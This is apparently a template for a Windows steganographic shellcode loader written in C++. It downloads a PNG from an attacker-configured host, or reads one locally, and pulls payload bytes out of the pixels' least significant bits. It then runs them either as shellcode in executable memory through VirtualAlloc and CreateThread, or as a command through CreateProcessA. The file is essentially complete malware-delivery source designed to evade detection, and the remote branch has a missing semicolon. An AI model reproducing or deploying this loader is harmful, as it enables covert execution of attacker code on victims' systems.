#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <gdiplus.h>
#include <string>
#include <iostream>
#pragma comment(lib,"gdiplus.lib")

#define payload_type_shellcode 1
#define payload_type_cmd 2
#define PAYLOAD_TYPE payload_type_{{ payload_type }}

#define PAYLOAD_BITS {{ PAYLOAD_BITS }}
#define delivery_method_remote 1
#define delivery_method_local 2
#define DELIVERY_METHOD delivery_method_{{ delivery_method }}

#if DELIVERY_METHOD == delivery_method_remote
    #define LHOST L"{{ LHOST }}"
    #define LPORT {{ LPORT }}
    #define URL_PATH L"{{ URL_PATH }}"

    #include <winhttp.h>
    #pragma comment(lib, "winhttp.lib")
#endif

using namespace Gdiplus;


char get_lsb(char target, char source) {
    return (target << 1) | (source & 1);
}



const int shellcode_len = PAYLOAD_BITS;
char* payload_data = new char[shellcode_len / 8];


#if DELIVERY_METHOD == delivery_method_remote
    void read_image() {
        // get image from http server
        HINTERNET hSession, hConnect, hRequest;

        hSession = WinHttpOpen(
            L"Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko",
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS,
            0
        );

        hConnect = WinHttpConnect(
            hSession,
            LHOST,
            LPORT,
            0
        );

        hRequest = WinHttpOpenRequest(
            hConnect,
            L"GET",
            URL_PATH,
            NULL,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            0
        );

        WinHttpSendRequest(
            hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0,
            WINHTTP_NO_REQUEST_DATA,
            0,
            0,
            0
        );

        WinHttpReceiveResponse(hRequest, NULL);

        DWORD dwSize;
        DWORD dwBytesRead;
        DWORD dwOffset = 0;

        WinHttpQueryDataAvailable(hRequest, &dwSize);

        std::string data;


        do
        {
            dwOffset = data.size();
            data.resize(dwSize + dwOffset);

            WinHttpQueryDataAvailable(hRequest, &dwSize);
            WinHttpReadData(hRequest, &data[dwOffset], dwSize, &dwBytesRead);

            data.resize(dwBytesRead + dwOffset);

        } while (dwSize > 0);


        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);


        // init an IStream in memory to create a bitmap later
        HGLOBAL img_gl_buffer = GlobalAlloc(GMEM_MOVEABLE, data.size() + 1);
        LPVOID img_buffer = GlobalLock(img_gl_buffer);

        CopyMemory(img_buffer, data.c_str(), data.size() + 1);

        IStream* img_stream = NULL;
        CreateStreamOnHGlobal(img_buffer, FALSE, &img_stream);



        // Init Gdiplus
        GdiplusStartupInput gdiplusStartupInput;
        ULONG_PTR gdiplusToken;
        GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);



        // load image
        Gdiplus::Bitmap* bmp = Gdiplus::Bitmap::FromStream(img_stream);

        Color c;
        char channels[3];

        int length = shellcode_len;
        int pos = 0;

        for (int i = 0; i < bmp->GetHeight(); i++) {
            for (int j = 0; j < bmp->GetWidth(); j++) {

                bmp->GetPixel(j, i, &c);

                channels[0] = c.GetR();
                channels[1] = c.GetG();
                channels[2] = c.GetB();

                for (int k = 0; k < 3; k++) {
                    if (length <= 0) {
                        return;
                    }

                    payload_data[pos / 8] = get_lsb(payload_data[pos / 8], channels[k]);
                    pos++;
                    length--;
                }
            }
        }
        GdiplusShutdown(gdiplusToken);
    }
#else
    void read_image(LPCWSTR filename) {

    // Init Gdiplus
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    // load image
    Gdiplus::Bitmap bmp(filename);

    Color c;
    char channels[3];

    int length = shellcode_len;
    int pos = 0;

    for (int i = 0; i < bmp.GetHeight(); i++) {
        for (int j = 0; j < bmp.GetWidth(); j++) {
            
            bmp.GetPixel(j, i, &c);
            
            channels[0] = c.GetR();
            channels[1] = c.GetG();
            channels[2] = c.GetB();

            for (int k = 0; k < 3; k++) {
                if (length <= 0) {
                    return;
                }

                payload_data[pos / 8] = get_lsb(payload_data[pos / 8], channels[k]);
                pos++;
                length--;
            }
        }
    }
    GdiplusShutdown(gdiplusToken);
}
#endif

#if PAYLOAD_TYPE == payload_type_cmd
    void run() {
        STARTUPINFOA si;
        ZeroMemory(&si, sizeof(STARTUPINFOA));
        PROCESS_INFORMATION pi;

        printf_s("%s", payload_data);
        CreateProcessA(
            NULL,
            payload_data,
            NULL,
            NULL,
            FALSE,
            NULL,
            NULL,
            NULL,
            &si,
            &pi
        );
        Sleep(3000);
    }
#else
    void run() {
        //LPVOID heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
        //LPVOID ptr = HeapAlloc(heap, 0, shellcode_len / 8);

        LPVOID ptr = VirtualAlloc(0, (shellcode_len / 8), 0x3000, 0x40);
        RtlMoveMemory(ptr, payload_data, shellcode_len / 8);


        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ptr, NULL, 0, 0);
        Sleep(2000);
    }
#endif


int main() {
    #if DELIVERY_METHOD == delivery_method_local
        read_image(L"C:\\Users\\Blackberry\\Desktop\\projects\\yet-another-shellcode-obfuscator\\samples\\helpme_x64.png");
    #else
        read_image()
    #endif
    run();

    return 0;
}